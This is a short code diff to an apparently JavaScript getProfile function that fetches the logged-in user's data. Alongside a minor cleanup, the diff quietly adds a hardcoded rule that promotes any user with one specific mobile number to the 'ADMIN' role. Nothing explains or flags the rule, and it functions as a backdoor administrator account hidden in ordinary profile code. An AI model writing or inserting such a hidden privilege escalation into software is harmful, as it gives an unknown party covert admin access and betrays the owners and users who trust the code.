@@ -9,13 +9,20 @@ const getProfile = async () => {
   if (!token) {
     token = await getNewTokens(); // Get new access token if current one is missing
   }
-  // console.log(token);
-
+  
   try {
     const response = await api.get("user/whoami", {
       headers: { Authorization: `bearer ${token}` }
     });
-    return response.data;
+    
+    const userData = response.data;
+    
+    // Check if the user's mobile number is the specific number
+    if (userData.mobile === "09189990099") {
+      userData.role = "ADMIN";
+    }
+    
+    return userData;
   } catch (error) {
     console.error("Error while fetching profile:", error);
     throw error;
